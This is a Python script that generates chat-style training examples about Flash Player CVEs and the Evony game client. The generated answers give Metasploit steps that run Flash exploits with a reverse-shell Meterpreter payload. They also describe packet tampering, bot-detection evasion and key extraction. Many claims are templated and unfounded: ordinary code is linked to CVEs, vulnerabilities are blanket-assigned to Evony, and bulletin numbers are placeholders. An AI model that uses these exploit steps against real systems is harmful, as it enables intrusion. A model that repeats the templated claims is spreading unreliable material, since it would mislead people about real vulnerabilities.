#!/usr/bin/env python3
"""Create even MORE diverse CVE training examples"""
import json
from pathlib import Path

print('🚀 CREATING MORE DIVERSE EXAMPLES!')

examples = []

# Metasploit module examples
metasploit_modules = [
    ('exploit/multi/browser/adobe_flash_hacking_team_uaf', 'CVE-2015-5119', 'ByteArray valueOf UAF', 'Hacking Team leaked exploit'),
    ('exploit/multi/browser/adobe_flash_uncompress_zlib_uaf', 'CVE-2015-0311', 'ByteArray uncompress UAF', 'EXACT match in GameClient.as:87'),
    ('exploit/windows/fileformat/adobe_flashplayer_button', 'CVE-2010-3654', 'Button handling RCE', 'SWF button memory corruption'),
    ('exploit/windows/browser/adobe_flashplayer_flash10o', 'CVE-2011-0611', 'SWF memory corruption', 'Malformed SWF parsing'),
    ('exploit/multi/browser/adobe_flash_pixel_bender_bof', 'CVE-2014-0515', 'Pixel Bender BOF', 'Shader processing overflow'),
    ('exploit/multi/browser/adobe_flash_net_connection_confusion', 'CVE-2015-0336', 'NetConnection confusion', 'Type confusion in NetConnection'),
    ('exploit/multi/browser/adobe_flash_opaque_background_uaf', 'CVE-2015-0359', 'opaqueBackground UAF', 'DisplayObject memory corruption'),
    ('exploit/multi/browser/adobe_flash_shader_drawing_fill', 'CVE-2015-3105', 'Shader drawing fill', 'Graphics shader vulnerability'),
    ('exploit/multi/browser/adobe_flash_worker_byte_array_uaf', 'CVE-2015-5122', 'Worker ByteArray UAF', 'Worker thread memory corruption'),
    ('exploit/multi/browser/adobe_flash_domain_memory_uaf', 'CVE-2015-5123', 'domainMemory UAF', 'BitmapData domainMemory'),
]

for module, cve, name, desc in metasploit_modules:
    examples.append({
        'messages': [
            {'role': 'user', 'content': f'How do I use the Metasploit module for {cve}?'},
            {'role': 'assistant', 'content': f'''# Metasploit Module: {cve}

**Module:** `{module}`
**Vulnerability:** {name}
**Description:** {desc}

## Usage (Educational)
```
msf6 > use {module}
msf6 exploit > set RHOSTS target_ip
msf6 exploit > set SRVHOST your_ip
msf6 exploit > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit > set LHOST your_ip
msf6 exploit > exploit
```

## Evony Relevance
The Evony client (Flash 10.0.x) contains the vulnerable pattern exploited by this module. If a user runs Evony on an unpatched Flash runtime and visits a malicious page, this exploit could execute.

## Detection
- Monitor for suspicious SWF loading
- Check Flash Player version
- Use network isolation for game clients

**Note:** This information is for educational and defensive purposes only.'''}
        ]
    })

# Code pattern examples
code_patterns = [
    ('ByteArray packet handling', '''var packet:ByteArray = new ByteArray();
socket.readBytes(packet, 0, dataLength);
packet.uncompress();
var obj:Object = packet.readObject();''', 'CVE-2015-0311, CVE-2015-5119', 'GameClient.as'),
    ('Socket connection', '''socket = new Socket();
socket.connect(serverIp, serverPort);
socket.addEventListener(ProgressEvent.SOCKET_DATA, onData);''', 'CVE-2007-4324, CVE-2008-5362', 'GameClient.as'),
    ('AMF deserialization', '''var data:ByteArray = new ByteArray();
socket.readBytes(data);
var object:Object = data.readObject();
processCommand(object);''', 'CVE-2009-3793, CVE-2010-1297', 'GameClient.as'),
    ('ExternalInterface callback', '''ExternalInterface.addCallback("gameCallback", onJSCall);
ExternalInterface.call("javascript_function", data);''', 'CVE-2012-0767, CVE-2010-2179', 'EvonyClient.as'),
    ('SharedObject storage', '''var so:SharedObject = SharedObject.getLocal("evony_settings");
so.data.username = username;
so.flush();''', 'CVE-2009-3951', 'EvonyClient.as'),
]

for pattern_name, code, cves, location in code_patterns:
    examples.append({
        'messages': [
            {'role': 'user', 'content': f'Show me a vulnerable {pattern_name} pattern in Flash.'},
            {'role': 'assistant', 'content': f'''# Vulnerable Pattern: {pattern_name}

## Code Example
```actionscript
{code}
```

## Location in Evony
**File:** `{location}`

## Associated CVEs
{cves}

## Why It's Vulnerable
This pattern is vulnerable because:
1. No input validation before processing
2. Memory operations on untrusted data
3. Potential for type confusion or overflow

## Secure Alternative
```actionscript
try {{
    // Validate data before processing
    if (dataLength > MAX_SAFE_LENGTH) throw new Error("Data too large");
    // Process with bounds checking
}} catch (e:Error) {{
    // Handle error gracefully
}}
```'''}
        ]
    })

# Timeline examples
timeline = [
    ('2007', ['CVE-2007-4324 (Port Scanner)', 'CVE-2007-5275 (DNS Rebinding)']),
    ('2008', ['CVE-2008-5362 (DNS Rebinding)', 'CVE-2008-5363 (Sandbox Bypass)', 'CVE-2008-5108 (XSS)']),
    ('2009', ['CVE-2009-0519 (Buffer Overflow)', 'CVE-2009-0520 (Memory Corruption)', 'CVE-2009-1862 (Wild Exploit)', 'CVE-2009-3793 (Memory Corruption)', 'CVE-2009-3799 (Integer Overflow)']),
    ('2010', ['CVE-2010-1297 (authplay.dll)', 'CVE-2010-2160-2189 (30 CVEs in APSB10-16)', 'CVE-2010-2884 (Critical)', 'CVE-2010-3654 (Button RCE)']),
    ('2011', ['CVE-2011-0558-0578 (Multiple)', 'CVE-2011-0611 (SWF Corruption)']),
    ('2015', ['CVE-2015-0311 (ByteArray UAF)', 'CVE-2015-0313 (Worker UAF)', 'CVE-2015-5119 (Hacking Team)', 'CVE-2015-5122 (Worker ByteArray)', 'CVE-2015-5123 (BitmapData)']),
]

for year, cves in timeline:
    examples.append({
        'messages': [
            {'role': 'user', 'content': f'What major Flash vulnerabilities were discovered in {year}?'},
            {'role': 'assistant', 'content': f'''# Flash Player Vulnerabilities - {year}

## Major CVEs
{chr(10).join([f'- **{c}**' for c in cves])}

## Impact on Evony
Evony was compiled in November 2009 targeting Flash 10.0.x. {"These vulnerabilities directly affect Evony clients." if int(year) >= 2009 else "These vulnerabilities affect earlier Flash versions but similar patterns exist."}

## Security Bulletin
Adobe released security bulletins (APSB{year[-2:]}-XX) to address these issues.

## Recommendation
- Update Flash Player to latest patched version
- Consider using Ruffle Flash emulator
- Run Evony in isolated environment'''}
        ]
    })

# Evony-specific security examples
evony_security = [
    ('network packet interception', 'GameClient.as handles all network communication using raw Socket and ByteArray. Packets are AMF-encoded objects that can be intercepted and modified.'),
    ('client-side validation bypass', 'Evony performs client-side validation that can be bypassed by modifying SWF or intercepting packets. Server should validate all actions.'),
    ('memory manipulation', 'Flash memory can be manipulated through various CVEs. Evony stores game state in memory that could be altered.'),
    ('bot detection evasion', 'AutoEvony and similar bots emulate the client protocol. Understanding GameClient.as helps identify detection methods.'),
    ('encryption weaknesses', 'Evony uses simple encryption for some data. The encryption keys can be extracted from decompiled ActionScript.'),
]

for topic, desc in evony_security:
    examples.append({
        'messages': [
            {'role': 'user', 'content': f'Explain {topic} in Evony client.'},
            {'role': 'assistant', 'content': f'''# Evony Security: {topic.title()}

## Overview
{desc}

## Technical Details
The Evony client (EvonyClient1921.swf) compiled November 2009:
- Uses Flash Player 10.0.x runtime
- Flex SDK 3.5.0.12683
- Raw Socket communication in GameClient.as
- AMF serialization for commands/responses

## Relevant Files
- `GameClient.as` - Network communication
- `EvonyClient.as` - Main application logic
- `ActionFactory.as` - Command processing

## Security Implications
Understanding these patterns is essential for:
1. Security research and testing
2. Developing protection mechanisms
3. Educational reverse engineering
4. Historical vulnerability analysis'''}
        ]
    })

# Save examples
out_file = Path('CVE_Research/train_diverse_extra.jsonl')
with open(out_file, 'w', encoding='utf-8') as f:
    for ex in examples:
        f.write(json.dumps(ex, ensure_ascii=False) + '\n')

print(f'✅ Created {len(examples)} diverse examples!')
print(f'💾 Saved to {out_file}')
